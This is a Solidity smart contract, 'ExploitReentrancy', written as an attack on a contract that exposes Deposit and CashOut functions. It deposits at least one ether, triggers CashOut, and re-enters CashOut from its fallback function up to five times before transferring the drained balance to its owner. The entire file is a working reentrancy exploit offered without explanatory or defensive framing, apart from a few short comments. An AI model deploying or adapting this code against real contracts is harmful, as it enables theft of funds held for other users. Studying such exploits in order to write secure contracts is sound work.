pragma solidity ^0.4.19;

interface IETHFund {
    function Deposit() external payable;
    function CashOut(uint _am) external payable;
}

contract ExploitReentrancy {
    IETHFund public target;
    address owner;
    uint public attackCount;
    uint public maxAttacks = 5;

    constructor(address _target) public {
        target = IETHFund(_target);
        owner = msg.sender;
    }

    // Initial deposit to become a valid participant
    function beginAttack() external payable {
        require(msg.value >= 1 ether);
        target.Deposit.value(msg.value)();  // Deposit 1+ ether
        target.CashOut(msg.value);          // Start reentrancy
    }

    // Fallback is triggered by target's .call.value()
    function() public payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            target.CashOut(msg.value);  // Reenter
        } else {
            // Exit after enough iterations
            owner.transfer(address(this).balance);
        }
    }

    // In case we want to recover funds later
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

